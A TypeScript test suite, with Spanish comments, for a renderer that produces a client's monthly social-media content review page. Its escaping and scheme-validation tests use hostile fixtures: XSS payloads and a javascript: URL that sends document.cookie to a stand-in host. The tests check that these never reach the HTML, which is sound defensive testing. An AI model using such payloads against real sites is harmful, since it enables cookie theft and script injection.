import { describe, it, expect } from 'vitest';
import { renderizarContenido, type PiezaEntregable } from '@/render/contenido/documento';
import { metaFalsa, piezasFalsas } from '../fixtures/contenido';

// Las comprobaciones negativas miran solo el marcado: los estilos y el script
// en línea mencionan clases y rutas aunque la vista no las use.
const marcado = (h: string) => h.replace(/<style>[\s\S]*?<\/style>/g, '').replace(/<script>[\s\S]*?<\/script>/g, '');

const BASE = 'tok123/archivo/';
const render = (piezas = piezasFalsas(), meta = metaFalsa()) =>
  renderizarContenido(piezas, meta, { baseArchivos: BASE });

describe('entregable del mes · estructura', () => {
  const html = render();

  it('es un documento autónomo con el estilo y el logo dentro', () => {
    expect(html.startsWith('<!DOCTYPE html>')).toBe(true);
    expect(html).toContain('<style>');
    // El logo va incrustado, como en los otros entregables: el archivo suelto
    // no puede depender de /public.
    expect(html).toContain('class="logo" src="data:image');
    expect(html).not.toContain('<link rel="stylesheet" href="/');
  });

  it('trae las cuatro secciones numeradas con su entrada en el índice', () => {
    for (const [num, id] of [['01', 'vista-feed'], ['02', 'calendario'], ['03', 'feed'], ['04', 'historias']]) {
      expect(html).toContain(`id="${id}"`);
      expect(html).toContain(`href="#${id}"`);
      expect(html).toContain(`class="seccion-num">${num}<`);
    }
  });

  it('el título y la portada dicen el mes en palabras', () => {
    expect(html).toContain('<title>Contenido de septiembre · Olam Dental</title>');
    expect(html).toContain('<h1>Contenido de septiembre</h1>');
    expect(html).toContain('Septiembre 2026');
  });

  it('no lleva barra de operador ni botón de compartir: es lo que ve el cliente', () => {
    expect(marcado(html)).not.toContain('id="barra-op"');
    expect(marcado(html)).not.toContain('panel-compartir');
  });
});

describe('entregable del mes · portada', () => {
  it('cuenta las piezas por formato y solo los formatos que hay', () => {
    const html = render();
    expect(html).toContain('<span class="cifra-valor">6</span><span class="cifra-etiqueta">Piezas en total</span>');
    expect(html).toContain('<span class="cifra-valor">2</span><span class="cifra-etiqueta">Posts</span>');
    expect(html).toContain('<span class="cifra-valor">1</span><span class="cifra-etiqueta">Carruseles</span>');
    expect(html).toContain('<span class="cifra-valor">2</span><span class="cifra-etiqueta">Historias</span>');
  });

  it('la barra de avance dice «2 de 6 aprobadas» y llega al 33%', () => {
    const html = render();
    expect(html).toContain('2 de 6 aprobadas');
    expect(html).toContain('aria-valuenow="33"');
    expect(html).toContain('style="width:33%"');
  });

  it('el mensaje trae el plazo, la fecha límite y la cuenta regresiva', () => {
    const html = render();
    expect(html).toContain('2 días hábiles');
    expect(html).toContain('damos el mes por aprobado');
    expect(html).toContain('data-limite="2026-09-19T05:59:59.999Z"');
    expect(html).toContain('data-cuenta');
  });

  it('sin compartir no inventa fecha límite ni cuenta regresiva', () => {
    const html = render(piezasFalsas(), metaFalsa({ compartidoEn: null, limiteRevision: null }));
    expect(html).toContain('está en camino');
    expect(marcado(html)).not.toContain('data-limite=');
    expect(marcado(html)).not.toContain('Fecha límite');
  });

  // Un mes compartido al que se le apagó el plazo (`registrarRevision`, cuando
  // el plazo se consumió en turno del operador y el cliente se retracta). Ni es
  // «está en camino» —lo tiene delante— ni puede pintar una cuenta regresiva:
  // un contador en cero le diría que llegó tarde a un plazo que ya no existe.
  it('compartido y sin plazo: lo dice, y no pinta una cuenta regresiva en cero', () => {
    const html = render(piezasFalsas(), metaFalsa({ limiteRevision: null }));
    expect(html).toContain('ya no tiene fecha límite');
    expect(html).toContain('no vamos a dar por aprobado nada que no hayas aprobado tú');
    expect(html).toContain('Sin fecha límite');
    // Sigue diciendo cuándo se le compartió: el mes es suyo desde entonces.
    expect(html).toContain('Compartido</span>');
    expect(html).not.toContain('está en camino');
    expect(marcado(html)).not.toContain('data-limite=');
    expect(marcado(html)).not.toContain('data-cuenta');
  });

  // El mes cerrado: `aprobada` con el plazo ya vencido (`aceptaDecision`,
  // src/contenido/revision.ts). Aquí el cliente ya no puede decidir nada, así
  // que el documento no puede seguir diciéndole «tienes 2 días hábiles» con la
  // cuenta regresiva en cero — ni ofrecerle unos botones que la API rechaza.
  it('cerrado: lo dice con su fecha, sin cuenta regresiva y sin prometer plazo', () => {
    const html = render(piezasFalsas(), metaFalsa({ cerrado: true }));
    // Con `marcado`: el script en línea también dice «El plazo terminó» al
    // agotarse la cuenta, y aquí lo que importa es que lo diga el documento.
    expect(marcado(html)).toContain('El plazo terminó');
    expect(html).toContain('18 sep 2026, 11:59 p.m.');
    expect(html).toContain('escríbele a tu equipo');
    expect(html).not.toContain('damos el mes por aprobado');
    expect(marcado(html)).not.toContain('data-limite=');
    expect(marcado(html)).not.toContain('data-cuenta');
  });

  // Y lo que NO es un mes cerrado: el que el cliente aprobó dentro de su plazo.
  // Ese sigue teniendo su fecha viva, así que conserva la cuenta regresiva.
  it('aprobado pero con el plazo vivo sigue siendo un mes normal', () => {
    const html = render(piezasFalsas(), metaFalsa());
    expect(html).toContain('data-cuenta');
    expect(html).not.toContain('El plazo de revisión de este mes terminó');
  });
});

describe('entregable del mes · 01 vista del feed', () => {
  const html = render();

  it('arma la cuadrícula sola con las piezas de feed, sin las historias', () => {
    const celdas = html.match(/class="feed-celda"/g) ?? [];
    // 3 piezas de feed con fecha o sin ella (post, carrusel, reel, post) = 4.
    expect(celdas.length).toBe(4);
    expect(html).toContain('class="feed-rejilla"');
  });

  it('se lee como el perfil: lo más reciente primero y lo que no tiene fecha al final', () => {
    const rejilla = html.slice(html.indexOf('class="feed-rejilla"'), html.indexOf('</div>', html.indexOf('class="feed-rejilla"')));
    const orden = (rejilla.match(/href="#pieza-(\d+)"/g) ?? []).map((x) => Number(x.replace(/\D/g, '')));
    expect(orden).toEqual([3, 2, 1, 4]);
  });

  it('la pieza sin arte deja un hueco con su número, no una imagen rota', () => {
    expect(html).toContain('class="feed-vacia"');
  });
});

describe('entregable del mes · 02 calendario', () => {
  const html = render();
  const seccion = html.slice(html.indexOf('id="calendario"'), html.indexOf('id="feed"'));

  it('dibuja los 30 días de septiembre con el hueco del lunes que falta', () => {
    // 2026-09-01 es martes: un solo día vacío antes.
    expect((seccion.match(/class="dia vacio"/g) ?? []).length).toBe(1);
    expect((seccion.match(/class="dia-numero"/g) ?? []).length).toBe(30);
  });

  it('cada pieza cae en su día, con su color de estado y enlace a su tarjeta', () => {
    expect(seccion).toContain('class="dia-pieza aprobada" href="#pieza-1"');
    expect(seccion).toContain('class="dia-pieza cambios" href="#pieza-2"');
    expect(seccion).toContain('class="dia-pieza pendiente" href="#pieza-3"');
  });

  it('la pieza sin fecha no desaparece: baja a «Sin día en este mes»', () => {
    expect(seccion).toContain('Sin día en este mes');
    expect(seccion.slice(seccion.indexOf('Sin día en este mes'))).toContain('href="#pieza-4"');
  });
});

describe('entregable del mes · 03 contenido de feed', () => {
  const html = render();
  const seccion = html.slice(html.indexOf('id="feed"'), html.indexOf('id="historias"'));

  it('una tarjeta por pieza de feed, con su formato y su estado para los filtros', () => {
    expect((seccion.match(/class="pieza-tarjeta aparece"/g) ?? []).length).toBe(4);
    expect(seccion).toContain('id="pieza-1" data-pieza data-formato="post" data-estado="aprobada"');
  });

  it('el carrusel trae visor con una miniatura por slide', () => {
    const tarjeta = seccion.slice(seccion.indexOf('id="pieza-2"'), seccion.indexOf('id="pieza-3"'));
    expect((tarjeta.match(/class="pieza-miniatura"/g) ?? []).length).toBe(3);
    expect(tarjeta).toContain('data-visor-principal');
  });

  it('el reel alojado fuera se ofrece como enlace, no como reproductor roto', () => {
    const tarjeta = seccion.slice(seccion.indexOf('id="pieza-3"'), seccion.indexOf('id="pieza-4"'));
    expect(tarjeta).toContain('href="https://videos.ejemplo.mx/reel-3.mp4"');
    expect(tarjeta).toContain('rel="noopener noreferrer"');
    expect(tarjeta).not.toContain('<video');
  });

  it('el copy se puede copiar y conserva sus saltos de línea', () => {
    expect(seccion).toContain('class="copy-texto" data-copia');
    expect(seccion).toContain('Primera línea\nSegunda línea');
    expect((seccion.match(/data-copiar /g) ?? []).length).toBeGreaterThanOrEqual(4);
  });

  it('el CTA, los hashtags y la nota del cliente salen cuando existen', () => {
    expect(seccion).toContain('Llamado a la acción');
    expect(seccion).toContain('class="hashtags-texto" data-copia');
    expect(seccion).toContain('Cambiar el color del segundo slide.');
  });

  it('los filtros solo ofrecen los formatos y estados que este mes tiene', () => {
    expect(seccion).toContain('data-filtro="formato" data-valor="post"');
    expect(seccion).toContain('data-filtro="formato" data-valor="carrusel"');
    expect(seccion).toContain('data-filtro="formato" data-valor="reel"');
    // La historia tiene su propia sección: no es un filtro del feed.
    expect(seccion).not.toContain('data-filtro="formato" data-valor="historia"');
    expect(seccion).toContain('Mostrando 4 de 4');
  });
});

describe('entregable del mes · 04 historias', () => {
  const html = render();
  const seccion = html.slice(html.indexOf('id="historias"'));

  it('es una tira de tarjetas verticales, una por historia', () => {
    expect(seccion).toContain('class="historias-tira"');
    expect((seccion.match(/class="historia-tarjeta"/g) ?? []).length).toBe(2);
    expect(seccion).toContain('class="pieza-visor vertical"');
  });

  it('la historia en video se reproduce en la propia tarjeta', () => {
    expect(seccion).toContain('<video controls preload="metadata"');
  });
});

describe('entregable del mes · artes', () => {
  it('los artes subidos se piden con una ruta RELATIVA al propio documento', () => {
    const html = render();
    expect(html).toContain(`src="${BASE}11111111-1111-4111-8111-111111111111"`);
    // Relativa de verdad: ni absoluta ni con el dominio dentro.
    expect(html).not.toContain('src="/p/');
    expect(html).not.toMatch(/src="https?:\/\/[^"]*\/archivo\//);
  });

  it('un arte externo se usa tal cual, sin pasarlo por la base', () => {
    expect(render()).toContain('https://videos.ejemplo.mx/reel-3.mp4');
  });
});

describe('entregable del mes · lote vacío', () => {
  const html = render([], metaFalsa());

  it('no truena y dice en cada sección que todavía no hay nada', () => {
    expect(html).toContain('Todavía no hay piezas de feed');
    expect(html).toContain('Este mes todavía no tiene piezas de feed');
    expect(html).toContain('Este mes no lleva historias');
    expect(html).toContain('0 de 0 aprobadas');
  });

  it('el calendario sigue dibujando el mes completo', () => {
    expect((html.match(/class="dia-numero"/g) ?? []).length).toBe(30);
  });
});

describe('entregable del mes · escapado', () => {
  it('el copy y la nota del cliente nunca entran como HTML', () => {
    const piezas = piezasFalsas();
    piezas[0].copy = '<img src=x onerror=alert(1)>';
    piezas[1].notaCliente = '<script>alert(2)</script>';
    const html = marcado(render(piezas));
    expect(html).not.toContain('<img src=x');
    expect(html).not.toContain('<script>alert(2)');
    expect(html).toContain('&lt;img src=x');
  });
});

/**
 * Los controles de revisión (C2, diseño §6). La decisión que fijan estas
 * pruebas es la del reparto: **solo el portal aprueba**, el enlace público lee.
 */
describe('entregable del mes · revisión del cliente', () => {
  const conControles = () =>
    renderizarContenido(piezasFalsas(), metaFalsa(), { baseArchivos: BASE, revision: { controles: true, accesoHref: '/portal' } });

  it('por omisión NO trae controles: es lo que ve el enlace público', () => {
    const html = render();
    expect(marcado(html)).not.toContain('data-revision');
    expect(marcado(html)).not.toContain('Solicitar cambios');
  });

  it('el enlace público dice que es de solo lectura y a dónde ir para aprobar', () => {
    const html = render();
    expect(html).toContain('class="como-decidir solo-lectura"');
    expect(html).toContain('href="/portal"');
    expect(html).toContain('queda registrado quién aprobó qué y cuándo');
  });

  it('el enlace público no lleva ni una línea que hable de la API de revisión', () => {
    expect(render()).not.toContain('/api/contenido/piezas/');
  });

  /**
   * Un mes cerrado no pinta controles **aunque haya sesión**: el servidor
   * rechaza la decisión con un 409, y unos botones que siempre fallan son peor
   * que no tenerlos. Es cortesía de la pantalla, no el candado — el candado es
   * `aceptaDecision` (src/contenido/revision.ts).
   */
  it('el mes cerrado no trae controles ni en el portal, y dice por qué', () => {
    const html = renderizarContenido(piezasFalsas(), metaFalsa({ cerrado: true }), {
      baseArchivos: BASE, revision: { controles: true, accesoHref: '/portal' },
    });
    expect(marcado(html)).not.toContain('data-revision');
    expect(marcado(html)).not.toContain('Solicitar cambios');
    expect(html).not.toContain('/api/contenido/piezas/');
    expect(html).toContain('class="como-decidir cerrado"');
    expect(html).toContain('ya no se puede aprobar ni pedir cambios');
  });

  /**
   * Y el contrario, que es la decisión del dueño: un mes **aprobado con el
   * plazo vivo** conserva sus controles. El cliente que aprobó todo por su
   * cuenta y se arrepiente de una pieza sigue a tiempo, y el documento tiene que
   * dejarle hacerlo en vez de felicitarlo y esconder los botones.
   */
  it('el mes aprobado con el plazo vivo conserva sus controles', () => {
    const html = renderizarContenido(
      piezasFalsas().map((p) => ({ ...p, estadoCliente: 'aprobada' as const, notaCliente: null })),
      metaFalsa(),
      { baseArchivos: BASE, revision: { controles: true, accesoHref: '/portal' } },
    );
    expect(html).toContain('data-revision');
    expect(html).toContain('Solicitar cambios');
    expect(html).toContain('6 de 6 aprobadas');
  });

  it('con controles, cada pieza trae Aprobar y Solicitar cambios con su id', () => {
    const html = conControles();
    for (const p of piezasFalsas()) {
      expect(html, `pieza ${p.numero}`).toContain(`data-revision data-pieza="${p.id}"`);
    }
    // Las historias también: los mismos controles (diseño §7).
    expect(html).toContain('data-pieza="p5"');
    expect(html.match(/data-decision="aprobar"/g)?.length).toBe(6);
  });

  it('con controles, el script de la revisión sí viaja', () => {
    expect(conControles()).toContain('/api/contenido/piezas/');
  });

  it('la nota anterior del cliente vuelve dentro de la caja de texto', () => {
    // La pieza 2 del fixture quedó con cambios y su nota.
    expect(conControles()).toContain('Cambiar el color del segundo slide.</textarea>');
  });

  it('con controles, la portada explica dónde están los botones', () => {
    const html = conControles();
    expect(html).toContain('class="como-decidir"');
    // `marcado` quita <style>: la regla `.como-decidir.solo-lectura` vive ahí
    // aunque esta vista no la use.
    expect(marcado(html)).not.toContain('solo-lectura');
  });

  it('la barra de avance y los chips quedan marcados para repintarse sin recargar', () => {
    const html = conControles();
    expect(html).toContain('data-avance-cuenta');
    expect(html).toContain('data-avance-relleno');
    expect(html).toContain('data-estado-chip');
  });

  it('sin JS los botones se esconden y se dice por qué', () => {
    const html = conControles();
    expect(html).toContain('.revision-botones{display:none');
    expect(html).toContain('html.js .revision-botones{display:flex;}');
    expect(html).toContain('hace falta tener JavaScript activado');
  });
});

/**
 * Defensa en profundidad sobre lo YA guardado. `contenido_piezas.arte` es
 * `jsonb` y `piezaVisibleJson` hace un `as Arte[]`, no un `parse`: una fila
 * escrita antes de que el esquema exigiera http/https llegaría intacta hasta
 * aquí. Y este mismo documento se sirve por el enlace público `/p/…`, que no
 * caduca y lo abre cualquiera, así que cerrar solo la entrada no basta.
 */
describe('entregable del mes · un enlace de arte con esquema raro no llega al HTML', () => {
  const MALO = 'javascript:fetch("https://malo.mx?c="+document.cookie)';

  const conArte = (arte: PiezaEntregable['arte']): string => render([{
    id: 'px', numero: 9, formato: 'reel', plataforma: 'instagram',
    fechaPublicacion: '2026-09-15', copy: 'x', cta: '', hashtags: '',
    arte, estadoCliente: 'pendiente', notaCliente: null,
  }]);

  it('el «Ver el reel» no se pinta si el enlace no es web', () => {
    const html = conArte([{ tipo: 'video', url: MALO }]);
    expect(marcado(html)).not.toContain('javascript:');
    expect(marcado(html)).not.toContain('class="pieza-enlace"');
    // Y en su lugar queda el hueco honesto, no una imagen rota.
    expect(html).toContain('arte-pendiente');
  });

  it('con un enlace web sí se pinta, para que se vea que el corte es por el esquema', () => {
    const html = conArte([{ tipo: 'video', url: 'https://videos.ejemplo.mx/r.mp4' }]);
    expect(html).toContain('class="pieza-enlace" href="https://videos.ejemplo.mx/r.mp4"');
  });

  it('tampoco se cuela por el `src` del visor ni por las miniaturas del carrusel', () => {
    const html = conArte([
      { tipo: 'portada', url: MALO },
      { tipo: 'imagen', url: 'data:text/html,<script>alert(1)</script>' },
    ]);
    expect(marcado(html)).not.toContain('javascript:');
    expect(marcado(html)).not.toContain('data:text/html');
    expect(marcado(html)).not.toContain('data-slide=');
    expect(html).toContain('arte-pendiente');
  });

  it('ni por el `poster` del reproductor, que es el otro sitio donde cae la portada', () => {
    const html = conArte([
      { tipo: 'portada', url: MALO },
      // Con el video subido al Studio sí hay reproductor, y su `poster` sale de
      // la portada: es el caso en que el atributo de verdad se pinta.
      { tipo: 'video', fileId: '77777777-7777-4777-8777-777777777777' },
    ]);
    expect(html).toContain('<video controls preload="metadata"');
    expect(marcado(html)).not.toContain('javascript:');
    expect(marcado(html)).not.toContain('poster=');
  });

  it('ni por la cuadrícula del feed de la sección 01', () => {
    const html = render([{
      id: 'py', numero: 1, formato: 'post', plataforma: 'ambas',
      fechaPublicacion: '2026-09-02', copy: '', cta: '', hashtags: '',
      arte: [{ tipo: 'imagen', url: MALO }], estadoCliente: 'pendiente', notaCliente: null,
    }]);
    expect(marcado(html)).not.toContain('javascript:');
    // La celda se pinta igual, con el número en vez de la imagen.
    expect(html).toContain('class="feed-vacia"');
  });
});
